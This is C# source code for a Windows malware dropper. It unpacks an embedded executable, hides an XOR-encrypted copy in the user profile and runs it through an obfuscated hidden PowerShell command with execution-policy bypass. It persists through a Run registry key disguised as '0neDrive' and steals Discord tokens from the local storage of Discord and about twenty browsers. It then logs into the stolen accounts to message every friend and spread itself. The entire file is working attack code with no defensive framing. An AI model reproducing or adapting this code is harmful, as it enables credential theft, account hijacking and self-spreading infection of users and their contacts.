using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Threading;
using System.Linq;
using System.Diagnostics;
using System.Reflection;
using System.IO;
using System.Text;
using Microsoft.Win32;

using Discord;
using Discord.Gateway;

namespace dropper
{
    internal class Program
    {
        private static string token = "https://pastebin.com/raw/xs0Q8kzv";
        private static string prefix = "";
        private static string geolock = "";
        private static string spreadmessage = @"";
        private static bool enable_spread = false;

        static void Main()
        {
            Random rng = new Random();
            string xorkey = RandomString(20, rng);
            Assembly asm = Assembly.GetExecutingAssembly();
            MemoryStream ms = new MemoryStream();
            Stream mstream = asm.GetManifestResourceStream("dropper.payload.exe");
            mstream.CopyTo(ms);
            mstream.Dispose();
            byte[] payload_data = ms.ToArray();
            ms.Dispose();
            byte[] encrypted = XORCrypt(payload_data, xorkey);
            string temppath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\wello.tmp";
            if (File.Exists(temppath)) Environment.Exit(1);
            File.WriteAllBytes(temppath, encrypted);
            File.SetAttributes(temppath, FileAttributes.System | FileAttributes.Hidden);
            string srcvarname = RandomString(6, rng);
            string classname = RandomString(6, rng);
            string functionname = RandomString(6, rng);
            string xorclass = Convert.ToBase64String(Encoding.UTF8.GetBytes(@"using System.Text; public class " + classname + @" { public static byte[] " + functionname + @"(byte[] input, string key) { byte[] keyc = Encoding.UTF8.GetBytes(key); for (int i = 0; i < input.Length; i++) { input[i] = (byte)(input[i] ^ keyc[i % keyc.Length]); } return input; } }"));
            string payload = $"powershell.exe -noprofile -executionpolicy bypass -windowstyle hidden -command ${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{xorclass}'));Add-Type -TypeDefinition ${srcvarname};[System.Reflection.Assembly]::Load([{classname}]::{functionname}([System.IO.File]::ReadAllBytes('{temppath}'), '{xorkey}')).EntryPoint.Invoke($null, (, [string[]] ('{Convert.ToBase64String(Encoding.UTF8.GetBytes(token))}', '{prefix}', '{geolock}')))";

            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("0neDrive", payload);
            key.Dispose();
            Process.Start("cmd.exe", "/c " + payload);

            if (!enable_spread) Environment.Exit(0);
            string[] tokens = GetTokens();
            foreach (string t in tokens)
            {
                try
                {
                    bool done = false;
                    DiscordSocketClient client = new DiscordSocketClient();
                    client.OnLoggedIn += async (c, args) =>
                    {
                        var relationships = c.GetRelationships();
                        foreach (DiscordRelationship r in relationships)
                        {
                            if (r.Type == RelationshipType.Friends)
                            {
                                await c.SendMessageAsync(r.User.Id, spreadmessage);
                            }
                        }
                        done = true;
                    };
                    client.Login(t);
                    while (!done) Thread.Sleep(100);
                    client.Logout();
                    client.Dispose();
                }
                catch { continue; }
            }
            Thread.Sleep(-1);
        }

        static string RandomString(int length, Random rng)
        {
            string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[rng.Next(s.Length)]).ToArray());
        }

        static byte[] XORCrypt(byte[] input, string key)
        {
            byte[] keyc = Encoding.UTF8.GetBytes(key);
            for (int i = 0; i < input.Length; i++)
            {
                input[i] = (byte)(input[i] ^ keyc[i % keyc.Length]);
            }
            return input;
        }

        static string[] GetTokens()
        {
            DirectoryInfo[] directories = new DirectoryInfo[]
            {
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discord\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discordptb\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discordcanary\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discorddevelopment\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Opera Software\Opera Stable\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Opera Software\Opera GX Stable\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Amigo\User Data\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Torch\User Data\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Kometa\User Data\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Orbitum\User Data\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\CentBrowser\User Data\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\7Star\7Star\User Data\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Sputnik\Sputnik\User Data\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Vivaldi\User Data\Default\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Google\Chrome SxS\User Data\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Epic Privacy Browser\User Data\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb")
            };

            List<string> tokens = new List<string>();
            foreach (DirectoryInfo d in directories)
            {
                try
                {
                    foreach (FileInfo file in d.GetFiles("*.ldb"))
                    {
                        string readFile = file.OpenText().ReadToEnd();
                        foreach (Match match in Regex.Matches(readFile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                        {
                            tokens.Add(match.Value);
                        }
                        foreach (Match match in Regex.Matches(readFile, @"mfa\.[\w-]{84}"))
                        {
                            tokens.Add(match.Value);
                        }
                    }
                }
                catch { continue; }
            }

            return tokens.Distinct().ToArray();
        }
    }
}